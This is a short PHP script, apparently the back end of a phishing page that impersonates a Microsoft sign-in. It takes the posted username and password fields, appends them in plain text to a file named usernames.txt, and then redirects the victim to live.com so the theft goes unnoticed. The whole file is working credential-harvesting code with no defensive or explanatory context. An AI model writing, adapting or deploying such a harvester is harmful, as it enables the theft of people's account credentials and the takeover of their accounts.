<?php

file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://live.com');
exit();
?>
